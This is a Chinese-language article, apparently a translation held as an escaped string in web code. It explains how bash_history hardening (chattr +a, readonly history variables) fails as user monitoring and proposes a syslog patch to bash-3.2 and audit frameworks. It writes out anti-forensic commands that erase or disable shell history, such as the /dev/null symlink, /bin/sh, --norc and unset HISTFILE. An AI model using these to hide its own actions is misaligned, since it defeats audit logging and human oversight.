\u6211\u4eec\u5c06\u4fee\u6539bash\u7684\u6e90\u7801\u6765\u5b9e\u73b0\u201d\u65e0\u654c\u201dlogging\u673a\u5236\uff0c\u4e5f\u5c06\u770b\u5230\u201d\u65e0\u654c\u201d\u5e76\u4e0d\u662f\u771f\u6b63\u7684\u65e0\u654c\u3002\\n\\n\\n## \u4e00\uff1abash\u4e3a\u4f55\u9700\u8981logging\\nBash\u582a\u79f0*nix\u4e16\u754c\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684shell\uff0c\u5176\u7279\u6027\u4e4b\u4e00\u662f\u5386\u53f2\u547d\u4ee4(history)\u673a\u5236\u3002\u6b64\u673a\u5236\u4e3b\u8981\u7528\u4e8e\u4e3a\u7528\u6237\u63d0\u4f9b\u65b9\u4fbf\uff0d\uff0d\u5c11\u6572\u51e0\u4e0b\u952e\u76d8\uff0c\u63d0\u9ad8\u5de5\u4f5c\u6548\u7387\u3002\u7136\u800c\uff0c\u88ab\u5e7f\u6cdb\u8ba8\u8bba\u7684\u662fbash_history\u53ef\u4ee5\u7528\u4f5clogging\u673a\u5236\u4ee5\u6b64\u6765\u76d1\u63a7\u7528\u6237\u7684\u6d3b\u52a8\u3002\u6b64\u6587\u5c06\u5bf9\u4e0a\u8ff0\u95ee\u9898\u8fdb\u884c\u8ba8\u8bba\u5e76\u89e3\u91ca\u4e3a\u5565logging\u673a\u5236\u5728\u5c11\u6570\u4eba\u9762\u524d\u4f1a\u5931\u6548\u3002\u6211\u4eec\u5c06\u89c1\u5230\u5404\u79cd\u7528\u4e8e\u4fdd\u62a4history\u6587\u4ef6\u7684\u9632\u5fa1\u63aa\u65bd\u662f\u5982\u4f55\u4e0d\u8d39\u5439\u7070\u4e4b\u529b\u6216\u7a0d\u5fae\u8d39\u70b9\u529b\u5c31\u88ab\u7a81\u7834\u7684\u3002\u968f\u7740\u8ba8\u8bba\u7684\u8ddf\u8fdb\uff0c\u7a81\u7834\u7684\u9650\u5236\u4e5f\u5c06\u53d8\u5f97\u66f4\u4e25\uff0c\u4f46\u8fd9\u5e76\u4e0d\u4ee3\u8868\u7a81\u7834\u8d77\u6765\u5c31\u66f4\u56f0\u96be\uff0c\u4e0e\u4e4b\u76f8\u53cd\u5927\u90e8\u5206\u65b9\u6cd5\u90fd\u662f\u53ef\u4ee5\u4e0d\u8d39\u8111\u5b50\u7684\u3002\u6700\u540e\uff0c\u6211\u4eec\u5c06\u4fee\u6539bash\u7684\u6e90\u7801\u6765\u5b9e\u73b0\u201d\u65e0\u654c\u201dlogging\u673a\u5236\uff0c\u4e5f\u5c06\u770b\u5230\u201d\u65e0\u654c\u201d\u5e76\u4e0d\u662f\u771f\u6b63\u7684\u65e0\u654c\u3002\\n\\n## \u4e8c\uff1a\u52a0\u56fabash_history\\n\\n\u5047\u8bbe\u4f60\u6240\u7ba1\u7406\u7684\u7cfb\u7edf\u63d0\u4f9bshell\u767b\u5f55\u529f\u80fd\uff0c\u4f60\u7684\u7528\u6237\u5f53\u4e2d\u6709\u4e2a\u522b\u53ca\u5176\u8ba8\u4eba\u538c\u7684\u5bb6\u4f19\uff0c\u4e8e\u662f\u4f60\u60f3\u76d1\u63a7\u4ed6\u7684\u6d3b\u52a8\uff0c\u56e0\u4e3a\u4f60\u975e\u5e38\u6000\u7591\u4ed6\u534a\u591c\u4e09\u66f4\u4f7f\u7528\u4f60\u6240\u8d1f\u8d23\u4fdd\u62a4\u7684CPU\u548c\u7cfb\u7edf\u8d44\u6e90\u4f5c\u6076\u610f\u884c\u4e3a\uff08\u6216\u662f\u5176\u4ed6\u7684\uff0c\u4f8b\u5982\u4e0b\u6bdb\u7247\u7b49\uff09\u3002\u6211\u4eec\u6682\u4e14\u53eb\u4ed6\u5c0f\u660e\uff08\u6b64\u5904\u539f\u6587\u4e3aBob\uff0cBob\u4e00\u540d\u5728\u56fd\u5916\u7ecf\u5e38\u7528\u6765\u6307\u4ee3\u574f\u86cb\uff09\u3002\\n\\n\u56e0\u4e3a\u6240\u6709\u7528\u6237\u90fd\u662f\u4f7f\u7528bash\u4f5c\u4e3a\u9ed8\u8ba4shell\uff0c\u4f60\u5f00\u59cb\u7740\u624b\u4fee\u6539bash\u7684\u914d\u7f6e\u6587\u4ef6\uff1a\\n\\n### \u7b2c1\u6b65\\n\\n\u4f7fbash\u5386\u53f2\u8bb0\u5f55\u6587\u4ef6\u548c\u76f8\u5173\u6587\u4ef6\u65e0\u6cd5\u88ab\u5220\u9664\u6216\u4fee\u6539\u3002\\n\\n\u5c0f\u660e\u6240\u505a\u7684\u7b2c\u4e00\u4ef6\u4e8b\u5e94\u8be5\u662f\u5efa\u7acbhistory\u5230/dev/null\u7684\u94fe\u63a5\u3002\\n\\n~~~shell\\nbob$ rm ~/.bash_history\\nbob$ ln -s /dev/null ~/.bash_history\\n~~~\\n\\n\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u5386\u53f2\u8bb0\u5f55\u6587\u4ef6\u4e3a\u53ea\u80fd\u88ab\u8ffd\u52a0\u6765\u8fdb\u884c\u963b\u6b62\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u6539\u53d8\u5176\u5c5e\u6027\uff1a\\n\\n~~~\\n# chattr +a /home/bob/.bash_history\\n~~~\\n\\n\u8fd9\u662f\u4f7f\u7528\u6587\u4ef6\u7cfb\u7edf\u9644\u52a0\u5c5e\u6027\u6765\u6307\u5b9a\u6587\u4ef6\u53ea\u80fd\u88ab\u8ffd\u52a0\uff0c\u5927\u591a\u6570\u6587\u4ef6\u7cfb\u7edf\u652f\u6301\u6b64\u529f\u80fd(\u4f8b\u5982ext2/3,XFS,JFS)\u3002\u5728FreeBSD\u4e0a\u53ef\u4ee5\u6267\u884c\uff1a\\n\\n~~~\\n# sappnd /home/bob/.bash_history\\n~~~\\n\\n\u4f60\u8fd8\u5e94\u4fee\u6539shell\u542f\u52a8\u76f8\u5173\u7684\u5176\u4ed6\u6587\u4ef6\u7684\u8fd9\u4e2a\u5c5e\u6027\uff1a\\n\\n~~~shell\\n# chattr +a /home/bob/.bash_profile\\n# chattr +a /home/bob/.bash_login\\n# chattr +a /home/bob/.profile\\n# chattr +a /home/bob/.bash_logout\\n# chattr +a /home/bob/.bashrc\\n~~~\\n\\n\u524d\u4e09\u4e2a\u6587\u4ef6\u5728\u4ea4\u4e92\u5f0fbash shell\uff08\u6216\u975e\u4ea4\u4e92\u5f0fsehll\u4f7f\u7528\u2013login\u9009\u9879\uff09\u8c03\u7528\u65f6\u88ab\u8bfb\u53d6(\u5728\u8bfb\u5b8c\u5168\u5c40\u914d\u7f6e\u6587\u4ef6/etc/profile\u540e)\u3002.bashrc\u6587\u4ef6\u53ea\u5728\u5f53non-login\u4ea4\u4e92\u5f0fshell\u8c03\u7528\u65f6\u88ab\u8bfb\u53d6\u3002\u8fd9\u610f\u5473\u7740\u5f53\u5c0f\u660e\u5df2\u767b\u8fdb\u7cfb\u7edf\u540e\uff0c\u7528\u4ee5\u4e0b\u65b9\u6cd5\u81ea\u5df1\u8c03\u7528\u4e00\u4e2a\u65b0shell\u65f6:\\n\\n`bob$ bash`\\n\\n\u6b64\u65f6\u53ea\u6709.bashrc\u6587\u4ef6\u88ab\u8bfb\u53d6\uff0c\u800c\u4e0a\u9762\u6240\u5217\u7684\u524d\u4e09\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e0d\u4f1a\u518d\u6b21\u88ab\u8bfb\u53d6\u4e86\u3002\\n\\n\u505a\u4e86\u4ee5\u4e0a\u5c5e\u6027\u7684\u4fee\u6539\u540e\u518d\u6765\u505a\u66f4\u8fdb\u4e00\u6b65\u7684\u201d\u52a0\u56fa\u201d\uff0c\u4e00\u4e2a\u6240\u8c13\u7684\u4fdd\u62a4\u63aa\u65bd\u3002\\n\\n### \u7b2c2\u6b65\\n\\n\u914d\u7f6e .bash*\u914d\u7f6e\u6587\u4ef6\\n\\n\u6240\u6709\u7684\u914d\u7f6e\u5c06\u9488\u5bf9.bashrc\u6587\u4ef6\uff0c\u56e0\u4e3a\u5176\u4ed6\u4e09\u4e2a\u914d\u7f6e\u6587\u4ef6\u672c\u8eab\u4f1a\u8c03\u7528.bashrc\uff0c\u4e5f\u5c31\u662f\u8bf4.bashrc\u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u88ab\u8bfb\u53d6 (\u4e0d\u7ba1\u7528\u6237\u662f\u5426\u521a\u767b\u5f55\u6216\u662f\u767b\u5f55\u540e\u624b\u5de5\u8c03\u7528bash shell)\u3002\\n\\n\u6240\u4ee5\uff0c\u6240\u6709\u4fee\u6539\u90fd\u9488\u5bf9.bashrc\u7684\u597d\u5904\u662f\u53ef\u4ee5\u9632\u6b62\u5c0f\u660e\u767b\u5f55\u540e\u624b\u5de5\u8c03\u7528\u65b0\u7684bash shell\u6765\u8df3\u8fc7\u4ec5\u5728.bash_profile,.bash_login,.profile\u4e09\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\u751f\u6548\u7684\u914d\u7f6e\u9009\u9879\uff0c\u53e6\u4e00\u597d\u5904\u662f\u8fd9\u4e09\u4e2a\u6587\u4ef6\u672c\u8eab\u90fd\u4f1a\u8c03\u7528.bashrc\uff0c\u6240\u4ee5\u5728\u9996\u6b21\u767b\u5f55\u7cfb\u7edf\u65f6.bashrc\u5f53\u4e2d\u7684\u914d\u7f6e\u4e5f\u4f1a\u751f\u6548\u3002\\n\\n~~~shell\\n# cat >> /home/bob/.bashrc << EOF\\n> shopt -s histappend\\n> readonly PROMPT_COMMAND=\u201dhistory -a\u201d\\n> EOF\\n~~~\\n\\n\u6b64\u5904histappend\u9009\u9879\u7684\u4f5c\u7528\u662f\u8ba9bash\u9644\u52a0\u4e0a\u6700\u540e\u4e00\u884c$HISTSIZE\u7ed9$HISTFILE\u6587\u4ef6\uff08\u4e00\u822c\u662f~/.bash_history\u6587\u4ef6\uff09\uff0c\u4e0d\u7ba1\u4ea4\u4e92\u5f0fshell\u4f55\u65f6\u9000\u51fa\u3002\u9ed8\u8ba4\u7684\uff0cbash\u6bcf\u6b21\u5747\u4f1a\u8986\u76d6$HISTFILE\u4ee5\u4fdd\u8bc1\u53ea\u6709\u4e00\u4e2asession\u88ab\u4fdd\u5b58\u4ee5\u6b64\u6765\u8282\u7ea6\u7a7a\u95f4\u3002\\n\\n\u73af\u5883\u53d8\u91cfPROMPT_COMMAND\u4f1a\u4fdd\u5b58\u4e00\u6761\u5c06\u88ab\u4f18\u5148\u6267\u884c\u7684\u547d\u4ee4\uff0c\u610f\u601d\u662f\u8bf4\u201dhistory -a\u201d\u547d\u4ee4\u5c06\u5728\u7528\u6237\u6267\u884c\u547d\u4ee4\u524d\u88ab\u4f18\u5148\u6267\u884c\uff0c\u8fd9\u5c06\u4fdd\u8bc1\u4e0d\u7ba1\u5f53\u524d\u547d\u4ee4\u524d\u4e00\u6761\u662f\u6267\u884c\u7684\u4ec0\u4e48\uff0c\u5b83\u5c06\u7acb\u5373\u88ab\u8ffd\u52a0\u8fdb$HISTFILE\uff0c\u800c\u4e0d\u7528\u7b49\u5f85\u6574\u4e2a\u4f1a\u8bdd\u7ed3\u675f\u518d\u5c06\u5386\u53f2\u547d\u4ee4\u4ece\u5185\u5b58\u8bb0\u5f55\u81f3\u786c\u76d8\u3002\\n\\n\u6b64\u5904\u7684readonly\u4f5c\u7528\u662f\u4f7f\u53d8\u91cf\u4e0d\u53ef\u4fee\u6539\u4ee5\u9632\u6b62\u88ab\u5c0f\u660e\u8986\u76d6\u6389\u6216\u662f\u76f4\u63a5\u5c4f\u853d\u6389\u3002\\n\\n\u6700\u540e\u8981\u5b8c\u6210\u7684\u6b65\u9aa4\u662f\u4f7f\u6240\u6709\u4e0ebash_history\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf\u90fd\u53d8\u4e3areadonly:\\n\\n~~~\\nreadonly HISTFILE\\nreadonly HISTFILESIZE\\nreadonly HISTSIZE\\nreadonly HISTCMD\\nreadonly HISTCONTROL\\nreadonly HISTIGNORE\\n~~~\\n\\n### \u7b2c3\u6b65\\n\\n\u7981\u6389\u7cfb\u7edf\u4e2d\u6240\u6709\u5176\u4ed6shell\uff0c\u4e00\u822c\u5305\u62eccsh,tcsh,ksh\u3002\\n\\n~~~\\n# chmod 750 csh\\n# chmod 750 tcsh\\n# chmod 750 ksh\\n~~~\\n\\n\u8fd9\u5c06\u963b\u6b62\u5c0f\u660e\u628abash shell\u5207\u6362\u6210\u5176\u4ed6shell\u3002\\n\\n\u73b0\u5728\uff0c\u673a\u654f\u70b9\u7684\u7ba1\u7406\u5458\u4f1a\u62b1\u6028\u4e0a\u9762\u7684\u90fd\u662fshit\uff01\\n\\n\u8fd8\u6709\u4e00\u4e2ashell\u9003\u51fa\u4e86\u6211\u4eec\u7684\u638c\u63a7\uff01\u5728\u4f60\u770b\u5b8c\u4ee5\u4e0a\u53d9\u8ff0\u8df3\u5165\u6d6e\u60f3\u8054\u7fe9\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u6765\u641e\u6e05\u4e00\u4e9b\u4e8b\u60c5\u3002\\n\\n\u5f88\u4e45\u5f88\u4e45\u4ee5\u524d\u2026 \uff08\u4f60\u61c2\u7684\uff09\uff0c\u539f\u672c\u53ea\u6709\u4e00\u4e2aBourne shell \u6216\u8005\u53ebsh\uff0c\u73b0\u5982\u4eca\uff0c/bin/sh\u5b9e\u9645\u4e0a\u662f/bin/bash\u7684\u4e00\u4e2a\u94fe\u63a5\u3002Bash\u5728\u88ab\u8c03\u7528\u65f6\u68c0\u67e5\u5b83\u662f\u4ee5\u54ea\u4e2a\u540d\u5b57\u88ab\u8c03\u7528\u7684\u5e76\u4ee5\u6b64\u6765\u5224\u65ad\u662f\u4e0d\u662f\u8c03\u7528sh\uff0c\u5b83\u8bd5\u56fe\u6a21\u4eff\u5386\u53f2\u7248\u672c\u7684sh\u7684\u884c\u4e3a\u5e76\u548cPOSIX\u6807\u51c6\u4fdd\u6301\u4e00\u81f4\u3002\\n\\n\u5982\u679c\u4ee5\u4ea4\u4e92\u5f0flogin shell\u6216\u975e\u4ea4\u4e92\u5f0fshell\u5e26\u4e0a\u2013login\u9009\u9879\u542f\u52a8\uff0c\u5b83\u624d\u8bfb\u53d6/etc/profile\u548c~/.profile\u6765\u521d\u59cb\u5316\u914d\u7f6e\u3002\u5982\u679c\u4ee5\u4ea4\u4e92\u5f0fshell\u88ab\u8c03\u7528\uff0c\u5219\u8bd5\u56fe\u89e3\u91ca$ENV\u53d8\u91cf\uff0c\u5f53$ENV\u975e\u7a7a\u5219\u4f7f\u7528\u5b83\u7684\u503c\u5f53\u4f5c\u9ed8\u8ba4\u914d\u7f6e\u5e76\u6267\u884c\u3002\u6211\u4eec\u5c06\u5728\u672c\u6587\u7684\u4e0b\u4e00\u8282\u8ba8\u8bba\u5982\u4f55\u5229\u7528\u8fd9\u70b9\u6765\u79d2\u6740bash\u7684\u6240\u6709\u8bbe\u7f6e\u3002\\n\\n## \u4e09\uff1a\u653b\u7834logging\u673a\u5236\\n\\n\u73b0\u5728\u662f\u65f6\u5019\u7ad9\u5728\u5c0f\u660e\u7684\u89d2\u5ea6\u6765\u770b\u4e0b\u6240\u6709\u95ee\u9898\u4e86\u3002\u6211\u4eec\u5c06\u9a8c\u8bc1\u4e0a\u9762\u7684\u9632\u5fa1\u662f\u5982\u4f55\u4e00\u6b65\u6b65\u88ab\u653b\u7834\u7684\u3002\u5728\u5b9e\u8df5\u4e2d\u7684\u53ef\u80fd\u6027\u662f\u65e0\u7a77\u8fdb\u7684\u3002\\n\\n\u4ee5\u4e0b\u6240\u63d0\u53ca\u7684\u7a81\u7834bash_history logging\u673a\u5236\u7684\u6280\u5de7\u53ea\u662f\u4e5d\u725b\u4e00\u6bdb\u3002\\n\\n* \u65b9\u6cd51\uff1a\u4f7f\u7528Bourne shell \u2013/bin/sh\u9003\u8131\u672f\\n\\n`$ /bin/sh`\\n\\n\u8c03\u7528sh\u4f1a\u5bfc\u81f4bash\u6a21\u4eff\u5982\u524d\u6240\u8ff0\u7684\u5386\u53f2\u7248\u672csh\u800c\u4e0d\u4f1a\u8bfb\u53d6\u4e0ebash\u76f4\u63a5\u76f8\u5173\u7684\u4efb\u4f55\u914d\u7f6e\u6587\u4ef6\u3002\u56e0\u6b64\uff0c\u5c0f\u660e\u73b0\u5728\u80fd\u591f\u907f\u5f00$HISTFILE\u53d8\u91cf\u4e86\uff0c\\n\\n\u56e0\u4e3a\u5b83\u5df2\u4e0d\u518d\u662freadonly\u3002\\n\\n`$ unset HISTFILE`\\n\\n\u8fd9\u4f1a\u4f7f\u5f97logging\u673a\u5236\u5728\u5f53\u524d\u4f1a\u8bdd\u4e2d\u76f4\u63a5\u840e\u6389\uff0c\u56e0\u4e3a\u6b64\u53d8\u91cf\u63a7\u5236\u7684\u5386\u53f2\u547d\u4ee4\u8bb0\u5f55\u6587\u4ef6\u5c06\u4f1a\u662f\u7a7a\u7684\u3002\\n\\n\u6ce8\uff1a\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528/bin/rbash\uff08\u5982\u679c\u7cfb\u7edf\u91cc\u5b58\u5728\u7684\u8bdd\uff09\u6765\u5b9e\u73b0\u76f8\u540c\u6548\u679c\uff0c\u5b83\u4f1a\u6a21\u4eff\u53d7\u9650\u7248\u672c\u7684bash\uff0c\u548csh\u4e00\u6837\u4e5f\u662f\u4e00\u4e2abash\u7684\u94fe\u63a5\uff0c\u4f46\u662f\u4f7f\u7528\u8d77\u6765\u786e\u5b9e\u6709\u4e9b\u8ba9\u4eba\u86cb\u75bc\u3002\\n\\n* \u65b9\u6cd52\uff1a\u8ba9bash\u4e0d\u52a0\u8f7d.bashrc\u914d\u7f6e\u6587\u4ef6\\n\\n\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u6cd5\u5b9e\u73b0\uff1a\\n\\n`$ /bin/bash \u2013norc`\\n\\n\u8fd9\u6837\u5373\u53ef\u7981\u6b62bash\u8bfb\u53d6.bashrc\u4ece\u800c\u88ab\u8bbe\u7f6e\u6210readonly\u7684\u53d8\u91cf\u53d8\u6210\u4e86writeable\uff0c\u7136\u540e\u50cf\u4e0b\u9762\u8fd9\u6837\u505a\uff1a\\n\\n`$ HISTFILE=`\\n\\n\u4f1a\u6e05\u7a7a$HISTFILE\u53d8\u91cf\u2014>\u65e0\u5386\u53f2\u8bb0\u5f55\u3002\\n\\n## \u56db\uff1aHacking bash-\u4f7f\u7528syslog\u65e5\u5fd7\u63a5\u53e3\\n\\n\u4ece\u4ee5\u4e0a\u6211\u4eec\u5f88\u6e05\u695a\u5730\u5f97\u51fa\u7ed3\u8bba\uff0d\uff0d\u4f20\u7edf\u7684\u52a0\u56fabash_history\u7684\u65b9\u6cd5\u5b9e\u9645\u4e0a\u90fd\u662f\u626f\u6de1\u3002\u7136\u800c\u6211\u4eec\u5374\u53ef\u4ee5\u66f4\u5411\u524d\u4e00\u6b65\u7684hack bash\u672c\u8eab\u6765\u51cf\u5c11logging\u673a\u5236\u7684\u8106\u5f31\u6027\u5e76\u63d0\u9ad8\u5176\u9690\u79d8\u6027\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5373\u4fbf\u5982\u6b64\u4e5f\u662f\u53ef\u4ee5\u88ab\u653b\u7834\u7684\u3002\u7531\u4e8ebash\u4e0e\u5185\u6838\u7684\u5dee\u8ddd\u5bfc\u81f4\u5b83\u5e76\u4e0d\u662f\u8db3\u591f\u7684\u5065\u58ee\u6765\u4f5c\u4e3a\u4e00\u4e2alogging\u8bbe\u5907\uff0c\u5373\u4fbf\u662fhack\u4e86\u5b83\u7684\u6838\u5fc3\u3002\\n\\n\u73b0\u5728\u7684\u60f3\u6cd5\u662f\u4fee\u6539bash\u6e90\u7801\u4f7f\u7528\u6237\u952e\u5165\u7684\u6240\u6709\u6307\u4ee4\u5168\u90e8\u53d1\u9001\u7ed9syslog\uff0c\u7531syslog\u5c06\u65e5\u5fd7\u8bb0\u5f55\u5230/var/log\u76ee\u5f55\u4e0b\u3002\u6211\u4eec\u5c06\u63d0\u4f9b\u4e00\u4e2a\u5feb\u901f\u800c\u4e14\u5f88\u9ec4\u5f88\u66b4\u529b\u7684\u65b9\u6cd5\u6765\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\uff0d\uff0d\u8fd9\u91cc\uff0c\u54ea\u4e2a\u7528\u6237\u952e\u5165\u7684\u54ea\u6761\u6307\u4ee4\u5c06\u6ca1\u6709\u5dee\u522b\u7684\u88ab\u5bf9\u5f85\uff0c\u800c\u8fd9\u4e5f\u662f\u53ef\u4ee5\u88ab\u5b9e\u73b0\u7684\u3002\\n\\n\u6211\u4eec\u7684\u63a5\u53e3\u7684\u6700\u4f73\u653e\u7f6e\u70b9\u662fparse.y\u6587\u4ef6\uff0c\u5b83\u7531bash\u7684yacc\u8bed\u6cd5\u7ec4\u6210\u3002\u5f53\u4e00\u6761\u6307\u4ee4\u5728shell\u4e2d\u88ab\u4e0b\u8fbe\u65f6bash\u89e3\u91ca\u5668\u5c06\u8fc5\u901f\u88ab\u8c03\u7528\u3002\u56e0\u6b64\uff0c\u5c06syslog\u94a9\u5b50\u653e\u7f6e\u5728\u89e3\u91ca\u5668\u521a\u597d\u5b8c\u6210\u5b83\u7684\u5de5\u4f5c\u524d\u4e00\u70b9\u70b9\uff0c\u8c8c\u4f3c\u662f\u4e2a\u597d\u529e\u6cd5\u3002\u9700\u8981\u4fee\u6539\u7684\u4ec5\u4ec5\u662f\u589e\u52a0\u4e24\u884c\u4ee3\u7801\uff1a\u5305\u542b\u8fdbsyslog.h\u548c\u8bbe\u7f6esyslog\u8c03\u7528\u3002\u6211\u4eec\u4f7f\u7528\u4e86bash-3.2\u7684\u6e90\u7801\uff1a\\n\\n~~~c\\n[ithilgore@fitz]$diff -E -b -c ~/bash-3.2/parse.y ~/hacked_bash/parse.y\\n*** ../../bash-3.2/bash-3.2/parse.y Tue Sep 19 13:37:21 2006\\n\u2014 parse.y Sat Jul 12 18:32:26 2008\\n***************\\n*** 19,24 ****\\n\u2014 19,25 \u2014-\\nFoundation, 59 Temple Place, Suite 330, Boston, MA 02111 USA. */\\n%{\\n + #include #include \u201cconfig.h\u201d\\n #include \u201cbashtypes.h\u201d \\n *************** *** 1979,1984 **** \u2014 1980,1986 \u2014\\n - shell_input_line_len = i;\\n /* == strlen (shell_input_line) */\\n set_line_mbstate ();\\n + syslog(LOG_LOCAL0 | LOG_CRIT, \u201c%s\u201d, shell_input_line);\\n #if defined (HISTORY) if (remember_on_history && shell_input_line && shell_input_line[0])\\n~~~\\n\\n\u4e0a\u9762\u7684\u8c03\u7528\u4ea7\u751f\u4e86\u4e00\u6761\u65e5\u5fd7\u6d88\u606f\uff0c\u6b64\u6d88\u606f\u5c06\u88absyslog\u6839\u636eLOG_CRIT\u7ea7\u522b\u9001\u5230local0\u7684\u8bbe\u5907\u4e0a\u3002\u8981\u8ba9\u8fd9\u4e2a\u4e1c\u4e1c\u751f\u6548\u5219\u8fd8\u5fc5\u987b\u8981\u5728/etc/syslog.conf\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165\u4e00\u6761\uff1a\\n\\n`local0.crit /var/log/hist.log`\\n\\n\u81f3\u6b64\u7528\u6237\u4e0b\u8fbe\u7684\u6bcf\u6761\u6307\u4ee4\u90fd\u5c06\u8eba\u5728/var/log/hist.log\u91cc\uff0c\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e00\u822c\u60c5\u51b5\u4e0b\u65e5\u6709root\u7528\u6237\u6709\u8bfb\u6743\u9650\u3002\\n\\n\u8981\u6ce8\u610f\u7684\u662f\u4e0a\u9762\u6240\u63d0\u5230\u7684hack\u5e76\u4e0d\u533a\u5206\u662f\u5426\u4e3a\u4e0d\u540c\u7528\u6237\u7684\u8f93\u5165\u3002\u8981\u5b9e\u73b0\u7684\u8bdd\u8fd8\u6709\u66f4\u591a\u7684\u4e8b\u60c5\u9700\u8981\u505a\u7684\u3002\u7531\u4e8e\u6240\u6709\u7684\u547d\u4ee4\u90fd\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u90a3\u4e48\u7531shell\u811a\u672c\u6267\u884c\u6216\u542f\u52a8bash\u65f6\u7684\u914d\u7f6e\u6587\u4ef6\u6267\u884c\u6240\u4ea7\u751f\u7684\u5783\u573e\u4fe1\u606f\u4e5f\u662f\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\u7684\u3002\\n\\n\u73b0\u5728\u552f\u4e00\u5269\u4e0b\u7684\u95ee\u9898\u662f\u201d\u4e0a\u9762\u7684hack\u8981\u600e\u6837\u624d\u80fd\u88ab\u653b\u7834\uff1f\u201d\u5176\u5b9e\u8fd9\u76f8\u5f53\u6ef4\u7b80\u5355\uff1a\\n\\n\u2014->\u7f16\u8bd1\u6216\u4e0a\u4f20\u4e00\u4e2a\u4f60\u81ea\u5df1\u7684\u5e72\u51c0\u7684bash\u6216\u5176\u4ed6shell\u5373\u53ef\u641e\u5b9a\u3002\\n\\n\u7531\u4e8e\u4e0a\u9762\u7684hack\u662f\u5728\u7279\u5b9a\u7248\u672c\u7684\u57fa\u7840\u4e0a\u7684\u6240\u4ee5\u4f60\u7f16\u8bd1\u6216\u4e0a\u4f20\u7684\u5e72\u51c0bash\u53ef\u80fd\u5728\u4ed6\u7684\u7cfb\u7edf\u4e0a\u4f1a\u8fd0\u884c\u5931\u8d25\u3002\\n\\n## \u4e94\uff1a\u603b\u7ed3\\n\\nBash \u53ea\u662f\u4e00\u4e2ashell\uff0c\u5e76\u4e0d\u662f\u4e00\u4e2alogging\u8bbe\u5907\uff0c\u800cbash_history\u53ea\u662f\u7528\u6765\u4e3a\u7528\u6237\u63d0\u4f9b\u70b9\u65b9\u4fbf\u5c11\u6572\u51e0\u4e0b\u952e\u76d8\u800c\u5df2\u3002\u6beb\u4e0d\u88c5\u903c\u7684\u8bf4\u4e00\u53e5\u6240\u6709\u4f7f\u7528\u5b83\u6765\u5f53\u76d1\u63a7\u8bbe\u5907\u7684\u505a\u6cd5\u90fd\u662f\u767d\u642d\u3002\u5982\u679c\u4f60\u662f\u4e2a\u8f83\u771f\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u4e14\u786e\u5b9e\u9700\u8981\u76d1\u63a7\u7528\u6237\u7684\u6d3b\u52a8\uff0c\u90a3\u5c31\u5199\u4e2a\u5185\u6838\u6a21\u5757\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u952e\u76d8\u8bb0\u5f55\uff0c\u5e76\u6839\u636euid\u6216\u5176\u4ed6\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5c06\u4f1a\u975e\u5e38\u7ba1\u7528\u5e76\u4e14\u5f88\u96be\u88ab\u653b\u7834\uff08\u53ea\u662f\u5f88\u96be\u4e0d\u662f\u6ca1\u90a3\u53ef\u80fd\uff09\u3002\\n\\n\u73b0\u5728\u5df2\u7ecf\u6709Linux\u5305\u62ecFreeBSD\u4e0b\u7684\u5ba1\u8ba1\u6846\u67b6\u53ef\u4f9b\u9009\u62e9\u3002\u5728FreeBSD\u5e73\u53f0\uff0c\u7531Robert Watson\u548cTrustedBSD\u9879\u76ee\u5f00\u53d1\u7684\u5ba1\u8ba1\u6846\u67b6\u662f\u9009\u62e9\u4e4b\u4e00\u3002\u5728linux\u5e73\u53f0\uff0c\u7531\u6765\u81ea\u7ea2\u5e3d\u7684Steve Grubb\u5f00\u53d1\u7684Linux Auditing System\u4e5f\u662f\u4e00\u4e2a\u9009\u62e9\uff1ahttp://people.redhat.com/sgrubb/audit/\\n\\n## \u516d\uff1a\u53c2\u8003\u8d44\u6599\\n\\n* [1] bash & syslog man pages\\n\\n* [2] bash-3.2 source code -http://ftp.gnu.org/gnu/bash/bash-3.2.tar.gz"}]}}')}}]);